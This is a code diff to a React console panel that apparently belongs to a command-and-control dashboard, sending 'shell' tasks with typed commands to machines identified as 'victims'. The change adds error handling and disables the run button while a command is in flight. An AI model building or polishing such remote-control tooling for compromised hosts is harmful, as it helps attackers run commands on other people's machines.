@@ -1,6 +1,7 @@
 'use client';
 import { useEffect, useState } from 'react';
 import { Terminal } from 'lucide-react';
+import { toast } from 'sonner';
 import { useApi, mutate } from '@/hooks/useApi';
 import { useLiveContext } from '@/components/live-provider';
 import { Button } from '@/components/ui/button';
@@ -22,12 +23,14 @@ export function ConsolePanel({ victimId }: { victimId: string }) {
 
   async function run(event: React.FormEvent) {
     event.preventDefault();
-    if (!command.trim()) return;
+    if (!command.trim() || busy) return;
     setBusy(true);
     try {
       await mutate('/tasks', 'POST', { victim_ids: [victimId], name: 'shell', params: { command }, timeout_sec: 90 });
       setCommand('');
       refresh();
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 'command failed');
     } finally {
       setBusy(false);
     }
@@ -49,7 +52,7 @@ export function ConsolePanel({ victimId }: { victimId: string }) {
         <Terminal className="h-3.5 w-3.5 text-muted" />
         <Input value={command} onChange={(event) => setCommand(event.target.value)} placeholder="whoami" className="h-8 border-0 bg-transparent font-mono focus-visible:ring-0" />
         <Badge tone={busy ? 'warn' : 'default'}>{busy ? 'sending' : 'idle'}</Badge>
-        <Button size="sm" loading={busy}>run</Button>
+        <Button size="sm" loading={busy} disabled={busy || !command.trim()}>run</Button>
       </form>
     </div>
   );
